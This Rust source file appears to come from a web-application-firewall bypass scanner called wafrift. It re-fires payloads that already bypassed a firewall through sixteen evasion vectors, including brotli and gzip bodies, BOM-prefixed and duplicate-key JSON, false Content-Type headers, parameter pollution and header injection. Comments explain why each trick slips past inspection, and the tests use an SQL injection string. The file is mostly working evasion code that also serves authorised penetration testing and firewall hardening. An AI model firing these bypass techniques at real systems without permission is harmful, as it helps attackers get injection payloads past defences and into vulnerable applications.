//! Multi-vector probing — fire each top-confidence bypass payload
//! through every alternative delivery vector to find a richer
//! bypass set.
//!
//! ## Why this exists separately
//!
//! `scan/mod.rs` orchestrates a multi-phase pipeline; multi-vector
//! is just one phase. Keeping it inline grew the god file by 400
//! lines and made every new vector a touch on `scan/mod.rs`. This
//! module is the natural extraction point so a new delivery vector
//! is ONE row in `VECTORS` + ONE arm in `build_request_for_vector`
//! — a five-minute job, no scan-engine reading required.
//!
//! ## Vector axes
//!
//! Each vector tags the same payload bytes onto a different part
//! of the HTTP request so a WAF that perfectly inspects one
//! surface might miss another. Three independent axes:
//!
//! 1. **Compression-confusion** (`POST-form-br`, `POST-json-br`,
//!    `POST-form-gz`, `POST-json-gz`) — wrap the body in
//!    `Content-Encoding: br` or `gzip`. Brotli is the headline gap
//!    (most WAFs lack a brotli decompressor in the inspection
//!    pipeline). Gzip is the control — most WAFs DO decode gzip,
//!    so a gzip-only bypass is a separate (gzip-handling) bug.
//!
//! 2. **JSON parser-disagreement** (`POST-json-bom`,
//!    `POST-json-dupkey`, `POST-json-array`) — exploit body-
//!    processor edge cases. BOM-prefixed JSON: ModSec's processor
//!    rejects on BOM and skips body inspection while the origin
//!    parses fine. Duplicate keys: WAF takes first occurrence,
//!    most backends take last. Array root: rule-set wrote ARGS
//!    expecting object-root.
//!
//! 3. **Content-Type lying** (`POST-json-as-plain`,
//!    `POST-form-as-octet`) — declare a non-`application/json` /
//!    `application/x-www-form-urlencoded` Content-Type so the WAF
//!    skips body parsing. Lenient backends auto-detect or accept
//!    raw bodies anyway.
//!
//! 4. **Header / parameter shuffling** (`cookie`, `hpp`,
//!    `x-forwarded-for`, `referer`) — pre-existing vectors kept
//!    for completeness. WAFs sometimes weight header inspection
//!    lower than ARGS inspection.

use std::time::Duration;

use colored::Colorize;
use reqwest::Client;
use tokio_util::sync::CancellationToken;
use wafrift_encoding::compression::{self, Algorithm as CompressionAlgo};
use wafrift_transport::is_waf_block;

/// A single (vector_name, default_content_type) row in the
/// catalogue. The `name` is the dispatch key for
/// [`build_request_for_vector`]; the `content_type` is what the
/// builder usually sets (compression variants override it).
#[derive(Debug, Clone, Copy)]
pub struct Vector {
    pub name: &'static str,
    pub content_type: &'static str,
}

/// Catalogue. Vector ordering is meaningful — vectors that hit
/// rare WAF surfaces (BOM JSON, brotli body) come AFTER the
/// baseline form / JSON ones so the operator's text-mode output
/// has the natural-shape vectors at the top of the table.
pub const VECTORS: &[Vector] = &[
    Vector { name: "POST-form", content_type: "application/x-www-form-urlencoded" },
    Vector { name: "POST-json", content_type: "application/json" },
    Vector { name: "POST-multipart", content_type: "multipart/form-data" },
    Vector { name: "POST-form-br", content_type: "application/x-www-form-urlencoded" },
    Vector { name: "POST-json-br", content_type: "application/json" },
    Vector { name: "POST-form-gz", content_type: "application/x-www-form-urlencoded" },
    Vector { name: "POST-json-gz", content_type: "application/json" },
    Vector { name: "POST-json-bom", content_type: "application/json" },
    Vector { name: "POST-json-dupkey", content_type: "application/json" },
    Vector { name: "POST-json-array", content_type: "application/json" },
    Vector { name: "POST-json-as-plain", content_type: "text/plain" },
    Vector { name: "POST-form-as-octet", content_type: "application/octet-stream" },
    Vector { name: "cookie", content_type: "" },
    Vector { name: "hpp", content_type: "" },
    Vector { name: "x-forwarded-for", content_type: "" },
    Vector { name: "referer", content_type: "" },
];

/// The phase's I/O surface — keeps callers from having to know the
/// full ScanArgs shape and keeps the inputs to this module
/// minimal. `top_payloads` is the operator's top-confidence set
/// from the equivalence-class phase, already deduped.
pub struct PhaseInput<'a> {
    pub http: &'a Client,
    pub target: &'a str,
    pub param: &'a str,
    pub top_payloads: &'a [(String, Vec<String>)],
    pub cancel: &'a CancellationToken,
    pub scan_text: bool,
    pub delay: Duration,
    /// Starting counter for `vector::<name>` techniques so
    /// downstream telemetry stays monotone across phases.
    pub variant_id_base: usize,
}

/// What this phase produces. Counters are DELTAS — the caller
/// merges them into its running totals.
#[derive(Debug, Default)]
pub struct PhaseOutcome {
    pub total_fired_delta: usize,
    pub bypassed_delta: u32,
    pub blocked_delta: u32,
    pub errors_delta: u32,
    /// New bypass variants discovered this phase, in the same
    /// (id, payload, techs, confidence) shape `scan/mod.rs` uses.
    pub new_bypass_variants: Vec<(usize, String, Vec<String>, f64)>,
    /// (technique_tags, blocked) outcomes for every fire this
    /// phase — feeds the post-scan gene-bank merge.
    pub new_variant_outcomes: Vec<(Vec<String>, bool)>,
    /// Per-vector tallies for the text-mode summary table.
    pub vector_results: Vec<(String, u32, u32)>,
}

/// Build the reqwest::RequestBuilder for `vector` against the
/// target with `payload`. Returns `None` when the vector chooses
/// to skip this fire (e.g. a transient compression failure —
/// caller logs and moves on). Centralising the per-vector wire
/// shape here is the dedup win: scan/mod.rs no longer carries a
/// 400-line match.
fn build_request_for_vector(
    vector: &Vector,
    http: &Client,
    target: &str,
    param: &str,
    payload: &str,
    fire_counter: usize,
) -> Option<reqwest::RequestBuilder> {
    let ct = vector.content_type;
    match vector.name {
        "POST-form" => {
            let body = format!("{param}={}", urlencoding::encode(payload));
            Some(http.post(target).header("Content-Type", ct).body(body))
        }
        "POST-json" => {
            let body = serde_json::json!({ param: payload }).to_string();
            Some(http.post(target).header("Content-Type", ct).body(body))
        }
        "POST-multipart" => {
            let boundary = format!("----WafRiftBoundary{fire_counter:x}");
            let body = format!(
                "--{boundary}\r\nContent-Disposition: form-data; name=\"{param}\"\r\n\r\n{payload}\r\n--{boundary}--\r\n",
            );
            Some(
                http.post(target)
                    .header(
                        "Content-Type",
                        format!("multipart/form-data; boundary={boundary}"),
                    )
                    .body(body),
            )
        }
        "POST-form-br" | "POST-form-gz" => {
            let algo = if vector.name == "POST-form-br" {
                CompressionAlgo::Brotli
            } else {
                CompressionAlgo::Gzip
            };
            let raw = format!("{param}={}", urlencoding::encode(payload));
            match compression::compress(raw.as_bytes(), algo) {
                Ok(blob) => Some(
                    http.post(target)
                        .header("Content-Type", ct)
                        .header("Content-Encoding", blob.content_encoding)
                        .body(blob.body),
                ),
                Err(e) => {
                    eprintln!("[wafrift scan] compression {algo:?} skipped: {e}");
                    None
                }
            }
        }
        "POST-json-br" | "POST-json-gz" => {
            let algo = if vector.name == "POST-json-br" {
                CompressionAlgo::Brotli
            } else {
                CompressionAlgo::Gzip
            };
            let raw = serde_json::json!({ param: payload }).to_string();
            match compression::compress(raw.as_bytes(), algo) {
                Ok(blob) => Some(
                    http.post(target)
                        .header("Content-Type", ct)
                        .header("Content-Encoding", blob.content_encoding)
                        .body(blob.body),
                ),
                Err(e) => {
                    eprintln!("[wafrift scan] compression {algo:?} skipped: {e}");
                    None
                }
            }
        }
        "POST-json-bom" => {
            // UTF-8 BOM (EF BB BF) prefix on a JSON body. ModSec's
            // JSON body processor refuses on BOM and falls through
            // to "no JSON inspection" — payload escapes ARGS rules.
            let raw = serde_json::json!({ param: payload }).to_string();
            let mut body = Vec::with_capacity(3 + raw.len());
            body.extend_from_slice(&[0xEF, 0xBB, 0xBF]);
            body.extend_from_slice(raw.as_bytes());
            Some(http.post(target).header("Content-Type", ct).body(body))
        }
        "POST-json-dupkey" => {
            // Benign value FIRST, attack LAST. WAFs that scan only
            // the first occurrence miss the attack; most JSON libs
            // (Python, Java Jackson default, Go encoding/json,
            // serde_json with default settings) take the last.
            let body = format!(
                "{{\"{p}\":\"x\",\"{p}\":{v}}}",
                p = param,
                v = serde_json::Value::String(payload.to_string())
            );
            Some(http.post(target).header("Content-Type", ct).body(body))
        }
        "POST-json-array" => {
            let body = serde_json::json!([{ param: payload }]).to_string();
            Some(http.post(target).header("Content-Type", ct).body(body))
        }
        "POST-json-as-plain" => {
            // Content-Type lying — declare JSON body as text/plain.
            // WAFs skip JSON inspection; lenient backends still
            // parse the body as JSON.
            let raw = serde_json::json!({ param: payload }).to_string();
            Some(http.post(target).header("Content-Type", ct).body(raw))
        }
        "POST-form-as-octet" => {
            // Content-Type lying for forms — declare form body as
            // octet-stream. WAFs don't run form processing on
            // octet-stream; lenient backends still parse it.
            let body = format!("{param}={}", urlencoding::encode(payload));
            Some(http.post(target).header("Content-Type", ct).body(body))
        }
        "cookie" => Some(
            http.get(target)
                .header("Cookie", format!("{param}={}", urlencoding::encode(payload))),
        ),
        "hpp" => {
            let url = format!(
                "{target}?{param}=harmless&{param}={}",
                urlencoding::encode(payload)
            );
            Some(http.get(url))
        }
        "x-forwarded-for" => {
            let url = crate::scan::scan_url_with_param(
                target,
                param,
                &urlencoding::encode(payload),
            );
            Some(http.get(&url).header("X-Forwarded-For", payload))
        }
        "referer" => {
            let url = crate::scan::scan_url_with_param(
                target,
                param,
                &urlencoding::encode(payload),
            );
            Some(
                http.get(&url)
                    .header("Referer", format!("https://example.com/?{payload}")),
            )
        }
        _ => None,
    }
}

/// Run the multi-vector phase. Returns a [`PhaseOutcome`] the
/// caller merges into its running totals. Cancellable via the
/// CancellationToken — the loop exits cleanly between fires.
pub async fn run_phase(input: PhaseInput<'_>) -> PhaseOutcome {
    let mut outcome = PhaseOutcome::default();

    if input.scan_text {
        println!(
            "\n{}",
            format!(
                "[5/7] Multi-vector probing — {} payloads × {} vectors...",
                input.top_payloads.len(),
                VECTORS.len()
            )
            .bold()
            .magenta()
        );
    }

    for vector in VECTORS {
        if input.cancel.is_cancelled() {
            break;
        }
        let mut v_bypassed: u32 = 0;
        let mut v_blocked: u32 = 0;

        for (payload, techs) in input.top_payloads {
            if input.cancel.is_cancelled() {
                break;
            }
            let fire_counter = input.variant_id_base + outcome.total_fired_delta;
            let Some(builder) = build_request_for_vector(
                vector,
                input.http,
                input.target,
                input.param,
                payload,
                fire_counter,
            ) else {
                continue;
            };
            let result = builder.send().await;
            let is_blocked = match result {
                Ok(resp) => {
                    let status = resp.status().as_u16();
                    let body = resp.bytes().await.unwrap_or_default();
                    is_waf_block(status, &body)
                }
                Err(_) => {
                    outcome.errors_delta += 1;
                    continue;
                }
            };
            outcome.total_fired_delta += 1;
            let mut vtechs = techs.clone();
            vtechs.push(format!("vector::{}", vector.name));
            outcome.new_variant_outcomes.push((vtechs.clone(), is_blocked));

            if is_blocked {
                outcome.blocked_delta += 1;
                v_blocked += 1;
                if input.scan_text {
                    print!("{}", ".".bright_black());
                }
            } else {
                outcome.bypassed_delta += 1;
                v_bypassed += 1;
                outcome.new_bypass_variants.push((
                    input.variant_id_base + outcome.total_fired_delta,
                    payload.clone(),
                    vtechs,
                    0.95, // High confidence — proven payload, new vector.
                ));
                if input.scan_text {
                    print!("{}", "!".bright_green().bold());
                }
            }

            if !input.delay.is_zero() {
                tokio::time::sleep(input.delay).await;
            }
        }

        outcome
            .vector_results
            .push((vector.name.to_string(), v_bypassed, v_blocked));
    }

    if input.scan_text {
        for (name, vb, vbl) in &outcome.vector_results {
            let total = vb + vbl;
            let rate = if total > 0 {
                f64::from(*vb) / f64::from(total) * 100.0
            } else {
                0.0
            };
            let status = if *vb > 0 {
                format!("{vb}/{total} bypassed ({rate:.0}%)")
                    .green()
                    .to_string()
            } else {
                format!("0/{total} — fully blocked")
                    .bright_black()
                    .to_string()
            };
            println!("  {} {}: {}", "→".bright_magenta(), name.yellow(), status);
        }
    }

    outcome
}

#[cfg(test)]
mod tests {
    use super::*;

    fn http() -> Client {
        Client::builder().build().expect("client")
    }

    #[test]
    fn vector_catalogue_is_unique_by_name() {
        // Anti-rig: a duplicate vector name would silently fire
        // the SAME builder twice and bias the table.
        let mut seen = std::collections::HashSet::new();
        for v in VECTORS {
            assert!(seen.insert(v.name), "duplicate vector name: {}", v.name);
        }
    }

    #[test]
    fn vector_catalogue_covers_all_three_axes() {
        // The compression / JSON-confusion / CT-lying axes must
        // each contribute at least one vector. A refactor that
        // accidentally dropped an axis would silently weaken the
        // engine.
        let names: std::collections::HashSet<&str> =
            VECTORS.iter().map(|v| v.name).collect();
        assert!(names.contains("POST-form-br"), "missing brotli vector");
        assert!(names.contains("POST-json-bom"), "missing BOM vector");
        assert!(names.contains("POST-json-as-plain"), "missing CT-lying vector");
        assert!(names.contains("hpp"), "missing param-pollution vector");
    }

    #[test]
    fn build_post_form_emits_url_encoded_body() {
        let h = http();
        let builder = build_request_for_vector(
            &VECTORS[0],
            &h,
            "http://example.com/get",
            "q",
            "' OR 1=1--",
            0,
        )
        .expect("post-form builds");
        let req = builder.build().expect("build");
        assert_eq!(req.method(), "POST");
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        assert!(s.starts_with("q="));
        assert!(s.contains("%20") || s.contains("+") || s.contains("%27"));
    }

    #[test]
    fn build_post_json_emits_serde_json_body() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-json").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        let v: serde_json::Value = serde_json::from_str(s).unwrap();
        assert_eq!(v["q"], "abc");
    }

    #[test]
    fn build_post_json_bom_prefixes_utf8_bom_bytes() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-json-bom").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        assert_eq!(&body[..3], &[0xEF, 0xBB, 0xBF], "must lead with UTF-8 BOM");
        let json_part = std::str::from_utf8(&body[3..]).unwrap();
        let v: serde_json::Value = serde_json::from_str(json_part).unwrap();
        assert_eq!(v["q"], "abc");
    }

    #[test]
    fn build_post_json_dupkey_emits_two_q_keys() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-json-dupkey").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "attack", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        assert_eq!(s.matches("\"q\":").count(), 2, "must emit q twice");
        // Benign value must come FIRST so first-occurrence parsers
        // see "x" and miss the attack; last-occurrence parsers see
        // the attack. Verified positionally.
        let first_pos = s.find("\"q\":").unwrap();
        let second_pos = s.rfind("\"q\":").unwrap();
        assert!(first_pos < second_pos);
        // The attack value must be the second occurrence's value.
        let after_second = &s[second_pos..];
        assert!(after_second.contains("attack"));
    }

    #[test]
    fn build_post_json_array_emits_array_root() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-json-array").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        assert!(s.starts_with("["));
        let v: serde_json::Value = serde_json::from_str(s).unwrap();
        let arr = v.as_array().expect("array root");
        assert_eq!(arr.len(), 1);
        assert_eq!(arr[0]["q"], "abc");
    }

    #[test]
    fn build_post_json_as_plain_uses_text_plain_content_type() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-json-as-plain").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
            .unwrap()
            .build()
            .unwrap();
        assert_eq!(
            req.headers().get("content-type").unwrap(),
            "text/plain",
            "the CT-lying vector MUST declare text/plain"
        );
        // Body shape stays JSON — the lie is in the header only.
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        assert!(s.starts_with("{") && s.contains("\"q\""));
    }

    #[test]
    fn build_post_form_br_emits_content_encoding_br() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-form-br").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
            .unwrap()
            .build()
            .unwrap();
        assert_eq!(req.headers().get("content-encoding").unwrap(), "br");
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        // Brotli output must DIFFER from the plain bytes — the
        // whole point of the vector.
        assert_ne!(body, b"q=abc");
    }

    #[test]
    fn build_post_json_gz_round_trips_under_gzip() {
        use wafrift_encoding::compression::{Algorithm, CompressedBody, decompress};
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-json-gz").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
            .unwrap()
            .build()
            .unwrap();
        assert_eq!(req.headers().get("content-encoding").unwrap(), "gzip");
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let recovered = decompress(&CompressedBody {
            body: body.to_vec(),
            content_encoding: Algorithm::Gzip.content_encoding().to_string(),
        })
        .expect("gzip round-trip");
        let s = String::from_utf8(recovered).unwrap();
        let v: serde_json::Value = serde_json::from_str(&s).unwrap();
        assert_eq!(v["q"], "abc");
    }

    #[test]
    fn build_request_returns_none_for_unknown_vector() {
        // Defence in depth — a misspelled vector key must not
        // silently match a default builder.
        let h = http();
        let bogus = Vector {
            name: "POST-not-a-real-vector",
            content_type: "",
        };
        let r = build_request_for_vector(&bogus, &h, "http://x/", "q", "abc", 0);
        assert!(r.is_none());
    }

    #[test]
    fn build_hpp_emits_both_param_occurrences() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "hpp").unwrap();
        let req = build_request_for_vector(v, &h, "http://example.com/", "q", "attack", 0)
            .unwrap()
            .build()
            .unwrap();
        let url = req.url().to_string();
        assert!(url.contains("q=harmless"));
        assert!(url.contains("q=attack"));
        let harmless_pos = url.find("q=harmless").unwrap();
        let attack_pos = url.find("q=attack").unwrap();
        assert!(
            harmless_pos < attack_pos,
            "HPP must put benign first, attack last (last-occurrence-wins backends)"
        );
    }

    #[tokio::test]
    async fn run_phase_with_empty_payloads_returns_zero_deltas() {
        let h = http();
        let cancel = CancellationToken::new();
        let outcome = run_phase(PhaseInput {
            http: &h,
            target: "http://127.0.0.1:1/", // unreachable on purpose
            param: "q",
            top_payloads: &[],
            cancel: &cancel,
            scan_text: false,
            delay: Duration::ZERO,
            variant_id_base: 0,
        })
        .await;
        assert_eq!(outcome.total_fired_delta, 0);
        assert_eq!(outcome.bypassed_delta, 0);
        assert_eq!(outcome.blocked_delta, 0);
        assert!(outcome.new_bypass_variants.is_empty());
        // The vector loop still ran and populated vector_results
        // with one entry per vector (each showing 0/0), so a
        // future regression that skipped vectors entirely would
        // surface here.
        assert_eq!(outcome.vector_results.len(), VECTORS.len());
    }

    #[tokio::test]
    async fn run_phase_exits_immediately_when_cancelled() {
        let h = http();
        let cancel = CancellationToken::new();
        cancel.cancel();
        let outcome = run_phase(PhaseInput {
            http: &h,
            target: "http://127.0.0.1:1/",
            param: "q",
            top_payloads: &[("payload".into(), vec!["t".into()])],
            cancel: &cancel,
            scan_text: false,
            delay: Duration::ZERO,
            variant_id_base: 0,
        })
        .await;
        // Cancelled before any fire — total_fired_delta stays 0
        // and the per-vector loop bails on the first iteration.
        assert_eq!(outcome.total_fired_delta, 0);
    }
}
